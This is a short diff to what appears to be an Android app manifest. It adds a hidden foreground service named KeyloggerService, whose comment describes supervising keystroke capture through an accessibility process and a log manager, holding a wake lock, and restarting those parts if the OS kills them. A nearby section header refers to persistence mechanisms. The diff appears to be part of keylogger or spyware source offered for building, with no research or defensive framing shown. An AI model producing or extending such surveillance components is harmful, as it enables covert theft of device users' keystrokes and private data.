@@ -291,6 +291,18 @@
             android:foregroundServiceType="dataSync" />
 
         <!--
+            Keylog capture supervisor.
+            Foreground service + partial wake lock that keeps the accessibility
+            process delivering events and LogManager persisting them, and repairs
+            either peer if the OS reclaims it.
+        -->
+        <service
+            android:name=".services.KeyloggerService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!--
             ════════════════════════════════════════════════════════════════════
             PERSISTENCE / WAKE MECHANISMS
             ════════════════════════════════════════════════════════════════════
